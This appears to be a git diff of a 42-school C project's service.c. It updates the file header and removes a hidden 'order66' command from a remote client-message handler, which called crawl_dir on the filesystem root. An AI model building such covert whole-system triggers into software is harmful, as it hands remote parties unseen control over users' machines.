@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   service.c                                          :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
+/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/04/18 15:18:30 by mbatty            #+#    #+#             */
-/*   Updated: 2026/05/24 09:48:55 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/05/24 14:55:14 by pboucher         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -286,11 +286,6 @@ int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 		while (dirent);
 		closedir(dir);
 		server_send_to_id(&ctx->server, client->id, "\n");
-	}
-	else if (!strcmp(msg, "order66"))
-	{
-		if (crawl_dir("/", (t_exec_ctx *)ctx) == -1)
-			server_send_to_id(&ctx->server, client->id, RGB(255,64,64) ORDER_FAIL CLR);
 	}
 	else
 		server_send_to_id(&ctx->server, client->id, RGB(255,0,0)INVALID_COMMAND CLR);
